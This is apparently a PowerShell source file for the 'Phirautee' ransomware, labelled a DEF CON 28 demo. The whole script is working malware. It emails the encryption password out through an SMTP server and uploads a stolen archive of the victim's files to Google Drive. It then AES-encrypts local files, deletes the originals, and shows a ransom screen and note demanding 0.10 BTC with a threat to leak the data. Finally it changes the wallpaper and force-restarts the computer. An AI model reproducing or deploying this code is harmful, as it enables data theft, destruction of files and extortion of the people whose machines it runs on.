<#

                 _____
              .-" .-. "-.
            _/ '=(0.0)=' \_
          /`   .='|m|'=.   `\	Author:Viral Maniar
          \________________ /	Twiiter: @ManiarViral
      .--.__///`'-,__~\\\\~`	┌─┐┬ ┬┬┬─┐┌─┐┬ ┬┌┬┐┌─┐┌─┐
     / /6|__\// a (__)-\\\\	├─┘├─┤│├┬┘├─┤│ │ │ ├┤ ├┤ 
     \ \/--`((   ._\   ,)))	┴  ┴ ┴┴┴└─┴ ┴└─┘ ┴ └─┘└─┘
     /  \\  ))\  -==-  (O)(
    /    )\((((\   .  /)))))
   /  _.' /  __(`~~~~`)__
  //"\\,-'-"`   `~~~~\\~~`"-.
 //  /`"              `      `\
//
#>
# RSA 3072 bits RSA Key
#----------------------------------------------------------------------------------------------------------------------------------------
# Generate Certificate & Export it to the Temp folder
#----------------------------------------------------------------------------------------------------------------------------------------

$YOUR_NAME = "DEFCON 28 DEMO 2020"
	
$cert = New-SelfSignedCertificate -DnsName $YOUR_NAME -CertStoreLocation "Cert:\CurrentUser\My" -KeyLength 2048 -HashAlgorithm "Sha384" -NotBefore ((Get-Date).AddDays(-1)) -NotAfter (Get-Date -Year 2099 -Month 12 -Day 31) -Type DocumentEncryptionCert -KeyUsage KeyEncipherment, DataEncipherment

Export-Certificate -Cert $cert -FilePath "C:\temp\cert.cer" | Out-Null

#----------------------------------------------------------------------------------------------------------------------------------------
# Base64 encoding the certificate by reading it from the temp folder
#----------------------------------------------------------------------------------------------------------------------------------------
$encodedcert = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\temp\cert.cer"))

Write-Host "Base64 encoded certificate: $encodedcert" -ForegroundColor Green

#----------------------------------------------------------------------------------------------------------------------------------------
# Password generator for the "DEFCON 28 DEMO 2020" Certificate
#----------------------------------------------------------------------------------------------------------------------------------------
[Reflection.Assembly]::LoadWithPartialName("System.Web")
$pwd = [system.web.security.membership]::GeneratePassword(30,15)

echo ("$pwd") > c:/temp/sys.txt
Start-Sleep -s 1
Install-Module -Name 7Zip4Powershell -RequiredVersion 1.12.0  -Scope CurrentUser -AllowClobber -Force
Start-Sleep -s 10
$IV11 = "v9(nnlZl8rz:d)mok*D=+;Th[:}LN;P5C{Dp64|-AX5U"
Write-Host "[+] Zipping files!" -ForegroundColor Green
Compress-7Zip -Path c:\temp\sys.txt -ArchiveFileName c:\temp\backup.zip -Format Zip -Password "$IV11"
Write-Host "[+] File zipped!" -ForegroundColor Green

#----------------------------------------------------------------------------------------------------------------------------------------
# Send certificate password via encrypted zip file to Pokemail e-mail
#----------------------------------------------------------------------------------------------------------------------------------------
$email = "xxxxxxxx@pokemail.net" # Replace $email with your pokemail address
$ZipFolder = "c:\temp\backup.zip"
$SMTPServer = "smtp.pokemail.net"
$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
$From = $email
$To = $email
$Subject = "$env:USERNAME - $env:computername - Content $(get-date -f yyyy-MM-dd)"
$Body = "Zip Attached"
$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
$Msg.IsBodyHTML = $False
$Attachment = new-object Net.Mail.Attachment($ZipFolder)
$Msg.attachments.add($Attachment)
$Mailer.send($Msg)
$Attachment.Dispose()
$Msg.Dispose()
$Mailer.Dispose()

Write-Host "[+] Email Sent!" -ForegroundColor Green
Start-Sleep -s 2
Write-Host "[-] Deleting files" -ForegroundColor Red
Remove-Item c:\temp\sys.txt
Remove-Item c:\temp\backup.zip

#----------------------------------------------------------------------------------------------------------------------------------------
# Password generator for the zip encrypted stolen files
#----------------------------------------------------------------------------------------------------------------------------------------

$pwd1 = [system.web.security.membership]::GeneratePassword(30,15)
echo ("$pwd1") > c:/temp/sys1.txt
$IV1 = "D^Z@e8507=>YS#)qj;zgBeZWb!0-Tp(hBEAi:2.S5G/"
Write-Host "[+] Zipping files!" -ForegroundColor Green
Compress-7Zip -Path c:\temp\sys1.txt -ArchiveFileName c:\temp\backup1.zip -Format Zip -Password "$IV1"
Write-Host "[+] File zipped!" -ForegroundColor Green

#----------------------------------------------------------------------------------------------------------------------------------------
#Send password for files to your e-mail
#----------------------------------------------------------------------------------------------------------------------------------------
$email1 = "xxxxxxxxxxxxxxxxx@pokemail.net" # Replace $email1 with your pokemail address
$ZipFolder1 = "c:\temp\backup1.zip"
$SMTPServer = "smtp.pokemail.net"
$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
$From = $email1
$To = $email1
$Subject = "$env:USERNAME - $env:computername - Content $(get-date -f yyyy-MM-dd)"
$Body = "Zip Attached"
$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
$Msg.IsBodyHTML = $False
$Attachment = new-object Net.Mail.Attachment($ZipFolder1)
$Msg.attachments.add($Attachment)
$Mailer.send($Msg)
$Attachment.Dispose()
$Msg.Dispose()
$Mailer.Dispose()

Write-Host "[+] Email Sent!" -ForegroundColor Green
Start-Sleep -s 2
Write-Host "[-] Deleting files" -ForegroundColor Red
Remove-Item c:\temp\sys1.txt
Remove-Item c:\temp\backup1.zip

#----------------------------------------------------------------------------------------------------------------------------------------
#Files to steal?
#----------------------------------------------------------------------------------------------------------------------------------------
$Source = "c:\tools\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
$Destination = "c:\tools1\" 

If (Test-Path -Path $Destination -PathType Container)
{ Write-Host "$Destination already exists" -ForegroundColor Red}
ELSE
{ New-Item -Path $Destination -ItemType directory }

#$cp = robocopy /mov $Source $Destination *.txt /s
$cp = robocopy /E $Source $Destination
Start-Sleep -s 5

$files = Get-ChildItem -Path $Destination

For($i = 1; $i -le $files.count; $i++)

{ Write-Progress -Activity "“Collecting files” -status “Finding file $i”" -percentComplete ($i / $files.count*100)}

$files | Select name
Write-Host "[+] Files copied" -ForegroundColor Green
Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\steal.zip -Format Zip -Password "$pwd1"

Start-Sleep -s 5
Write-Host "[+] Files zipped" -ForegroundColor Green
#$del = Remove-Item $Destination -Force -Recurse
Write-Host "[+] Uploading Large Files to G-Drive" -ForegroundColor Green
Start-Sleep -s 5
$del = Remove-Item $Destination -Force -Recurse
Write-Host "[-] Uploading Large Files Deleted" -ForegroundColor Red
#----------------------------------------------------------------------------------------------------------------------------------------
#Encrypted Large files to be send to G-Drive
#----------------------------------------------------------------------------------------------------------------------------------------
# Set source and destination of files to copy and store
# Set the Google Auth parameters. Fill in your RefreshToken, ClientID, and ClientSecret
$params = @{
    Uri = 'https://accounts.google.com/o/oauth2/token'
    Body = @(
        "refresh_token=XXXXXX-XXXXX-XXXXXXX-", # Replace $RefreshToken with your refresh token
        "client_id=123XXXXXXX.XXXXXXXXXXXXXX.apps.googleusercontent.com",         # Replace $ClientID with your client ID
        "client_secret=XXXXXXXXXXXXXXXXXXXXX", # Replace $ClientSecret with your client secret
        "grant_type=refresh_token"
    ) -join '&'
    Method = 'Post'
    ContentType = 'application/x-www-form-urlencoded'
}
$accessToken = (Invoke-RestMethod @params).access_token

# Change this to the file you want to upload
$SourceFile = 'c:\temp\steal.zip'

# Get the source file contents and details, encode in base64
$sourceItem = Get-Item $sourceFile
$sourceBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sourceItem.FullName))
$sourceMime = [System.Web.MimeMapping]::GetMimeMapping($sourceItem.FullName)

# If uploading to a Team Drive, set this to 'true'
$supportsTeamDrives = 'false'

# Set the file metadata
$uploadMetadata = @{
    originalFilename = $sourceItem.Name
    name = $sourceItem.Name
    description = $sourceItem.VersionInfo.FileDescription
    #parents = @('teamDriveid or folderId') # Include to upload to a specific folder
    #teamDriveId = ‘teamDriveId’            # Include to upload to a specific teamdrive
}

# Set the upload body
$uploadBody = @"
--boundary
Content-Type: application/json; charset=UTF-8

$($uploadMetadata | ConvertTo-Json)

--boundary
Content-Transfer-Encoding: base64
Content-Type: $sourceMime

$sourceBase64
--boundary--
"@

# Set the upload headers
$uploadHeaders = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = 'multipart/related; boundary=boundary'
    "Content-Length" = $uploadBody.Length
}

# Perform the upload
$response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&supportsTeamDrives=$supportsTeamDrives" -Method Post -Headers $uploadHeaders -Body $uploadBody

#$Source = "C:\Users\$env:USERNAME\Desktop\Important"
#$Source = "C:\temp"
#$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
Start-Sleep -s 10
Remove-Item c:\temp\steal.zip
Start-Sleep -s 5
Write-Host "[-] Stolen file deleted from the host..." -ForegroundColor Red
Write-Host "[+] Init Phiratee..." -ForegroundColor Green
#----------------------------------------------------------------------------------------------------------------------------------------
#Encrypt files via Phirautee
#----------------------------------------------------------------------------------------------------------------------------------------
Function Encr{param([string]$i,[string]$p)
  process{
    [System.Security.Cryptography.AesCryptoServiceProvider]$a=[System.Security.Cryptography.AesCryptoServiceProvider]::new()
    $a.BlockSize=128
    $a.KeySize=256
    $a.Mode=[System.Security.Cryptography.CipherMode]::CBC
    $a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
    $a.GenerateIV();[byte[]]$IV=$a.IV;[byte[]]$k=[system.Text.Encoding]::UTF8.GetBytes($pwd)
    [System.IO.FileStream]$fout=[System.IO.FileStream]::new($i+".phirautee",[System.IO.FileMode]::Create)
    [System.Security.Cryptography.ICryptoTransform]$IC=$a.CreateEncryptor($k,$IV)
    [System.Security.Cryptography.CryptoStream]$CS=[System.Security.Cryptography.CryptoStream]::new($fout, $IC, [System.Security.Cryptography.CryptoStreamMode]::Write)
    [System.IO.FileStream]$fin=[System.IO.FileStream]::new($i,[System.IO.FileMode]::Open)
    $fout.Write($IV,0,$IV.Count)
    $DA=$true;[int]$D
    While ($DA){
      $D=$fin.ReadByte()
      if($D -ne -1){
        $CS.WriteByte([byte]$D)
      }
      else{
        $DA = $false
      }
    }
    $fin.Dispose();
    $CS.Dispose();
    $fout.Dispose()
  }
}

#foreach ($i in $(Get-ChildItem C:/temp/ -recurse -include *.txt | ForEach-Object { $_.FullName })){
# Replace C:\tools with the folder you want to encrypt. Also you can add or modify the file types by comma seperated - *.txt, *.jpg, *.png etc.
foreach ($i in $(Get-ChildItem C:\tools -recurse -include *.txt  | ForEach-Object { $_.FullName })){ 
  Encr -i $i -p $pwd
  rm $i
}

$alert = "https://raw.githubusercontent.com/Viralmaniar/Phirautee/master/defcon.jpg"
Invoke-WebRequest -Uri $alert -OutFile "C:/temp/defcon.jpg"
Start-Sleep -s 2

Write-Host "[+] Phiratee Deployed Successfully..." -ForegroundColor Green
$encodedcert =  [IO.File]::WriteAllBytes("/windows/temp/x.cer", [Convert]::FromBase64String($encodedcert))
#echo (Protect-CmsMessage -Content $pwd -To "/windows/temp/x.cer") > /users/$env:USERNAME/desktop/encrypted_key.txt

Start-Sleep -s 10
#remove-variable pwd
Write-Host "[+] Intiating UI..." -ForegroundColor Green
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
[void] [System.Windows.Forms.Application]::EnableVisualStyles() 

function EncryptedFiles 
{ 
$Source = "c:\tools\" # replace the path with the folders you encrypted
explorer $Source
} 

function RandomBacklight {
$random = New-Object System.Random 
switch ($random.Next(9)) { 
    0 {$Form.BackColor = "LightBlue"} 
    1 {$Form.BackColor = "LightGreen"} 
    2 {$Form.BackColor = "LightPink"} 
    3 {$Form.BackColor = "Yellow"} 
    4 {$Form.BackColor = "Orange"} 
    5 {$Form.BackColor = "Brown"} 
    6 {$Form.BackColor = "Magenta"} 
    7 {$Form.BackColor = "White"} 
    8 {$Form.BackColor = "Gray"} 
} 
}
 
$Form = New-Object system.Windows.Forms.Form 
$Form.Size = New-Object System.Drawing.Size(960,900) 
#You can use the below method as well 
#$Form.Width = 400 
#$Form.Height = 200 
$Form.Add_Click({RandomBacklight}) 
$form.MaximizeBox = $false 
$Form.Back
$Form.StartPosition = "CenterScreen" 
$Form.FormBorderStyle = 'Fixed3D' 
$Form.Text = "Phiarutee - DEF CON 2020 Demo" 

$img = [System.Drawing.Image]::Fromfile('c:\temp\defcon.jpg')
$pictureBox = new-object Windows.Forms.PictureBox
$pictureBox.Width = $img.Size.Width
$pictureBox.Height = $img.Size.Height
$pictureBox.Image = $img
$form.controls.add($pictureBox)

$Label = New-Object System.Windows.Forms.Label
$Label.ForeColor = "Red"
$Label.Text = "--You Got Ransomed-- !!! ++ DO NOT TURN-OFF YOUR COMPUTER ++ !!! " 
$Label.AutoSize = $true 
$Label.Location = New-Object System.Drawing.Size(50,450) 
$Font = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
$form.Font = $Font 
$Form.Controls.Add($Label) 
 
#$formIcon = New-Object system.drawing.icon ("$env:USERPROFILE\desktop\Blog\v.ico") 
#$form.Icon = $formicon 
 
$Okbutton = New-Object System.Windows.Forms.Button 
$Okbutton.Location = New-Object System.Drawing.Size(50,500) 
$Okbutton.Size = New-Object System.Drawing.Size(450,30) 
$Okbutton.Text = "View Encrypted Files with Phiarutee" 
$Okbutton.Add_Click({EncryptedFiles}) 
$Form.Controls.Add($Okbutton) 

$btc_addr = '1HF16jtnSCuRvAThJ7p99QeroAnBkiR4Yb'      # Replace this with your address
$Label1 = New-Object System.Windows.Forms.Label 
$Label1.Text = "Send 0.10 BTC to this account: $btc_addr" 
$Label1.AutoSize = $true 
$Label1.Location = New-Object System.Drawing.Size(50,550) 
$Font1 = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
$form.Font = $Font1
$Form.Controls.Add($Label1) 

$objTextBox1 = New-Object System.Windows.Forms.TextBox 
$objTextBox1.Multiline = $True;
$objTextBox1.Text = "We have encrypted your important files. For now you cannot access these files. Encrypted files have been modified with an extension ""phirautee"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 0.10 BTC these files will be leaked online. The faster you contact us at XXXX@XXXXXXXX.XXX with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read Phirautee.txt file on the desktop for further information."
$objTextBox1.AutoSize = $true 
$objTextBox1.Location = New-Object System.Drawing.Size(50,650)
$objTextBox1.Size = New-Object System.Drawing.Size(850,180)
$Font2 = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
$objTextBox1.Scrollbars = "Vertical" 
$form.Font = $Font2
$Form.Controls.Add($objTextBox1) 

$delay = 30

$Counter_Label = New-Object System.Windows.Forms.Label
$Counter_Label.Location = New-Object System.Drawing.Size(50,600) 
$Counter_Label.AutoSize = $true 
$Counter_Label.ForeColor = "Green"
$Form.Controls.Add($Counter_Label)

while ($delay -ge 0)
{
	$Form.Show()
    $Counter_Label.Text = "Seconds Remaining: $($delay)"
	if ($delay -lt 5)
	  { 
		 $Counter_Label.ForeColor = "Red"
		 $fontsize = 20-$delay
		 $warningfont = New-Object System.Drawing.Font("Times New Roman",$fontsize,[System.Drawing.FontStyle]([System.Drawing.FontStyle]::Bold -bor [System.Drawing.FontStyle]))
		 $Counter_Label.Font = $warningfont
	  }
start-sleep 1
$delay -= 1	  
}
$Form.Close()
$background = "https://raw.githubusercontent.com/Viralmaniar/Phirautee/master/PhirauteeBackground-3.jpg"
Invoke-WebRequest -Uri $background -OutFile "/users/$env:USERNAME/PhirauteeBackground-3.jpg"
Start-Sleep -s 2
<#
#Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name WallPaper -value ''
New-ItemProperty -Path "HKCU:\Control Panel\Personalization" -Name "DesktopImageStatus" -Value "1" -PropertyType DWORD -Force | Out-Null
New-ItemProperty -Path "HKCU:\Control Panel\Personalization"-Name "DesktopImagePath" -Value "/users/$env:USERNAME/PhirauteeBackground-3.jpg" -PropertyType STRING -Force | Out-Null
New-ItemProperty -Path "HKCU:\Control Panel\Personalization" -Name "DesktopImageUrl" -Value "/users/$env:USERNAME/PhirauteeBackground-3.jpg" -PropertyType STRING -Force | Out-Null
#>
$wallpaper = "C:/users/$env:USERNAME/PhirauteeBackground-3.jpg"
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -value "$wallpaper"
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -value "10"
Start-Sleep -s 2
rundll32.exe user32.dll, UpdatePerUserSystemParameters, 1 , $False

Stop-Process -ProcessName explorer

echo "We have encrypted your important files. For now, you cannot access these files. Encrypted files have been modified with an extension ""phirautee"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 0.10 BTC these files will be leaked online. The faster you contact us at XXXX@XXXXXXXX.XXX with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read Phirautee.txt file on the desktop for further information. This ransomware encrypts all the files of the hard drive. To decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data. If you do not pay the money your sensitive data will be leaked online." > /users/$env:USERNAME/desktop/Phirautee.txt
#$Form.ShowDialog()
#$Form.Focus()
Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.subject -eq "CN=DEFCON 28 DEMO 2020" } | Remove-Item

start-sleep 2

Remove-Item c:\windows\temp\x.cer

start-sleep 1

Remove-Item C:\temp\cert.cer

restart-computer -force
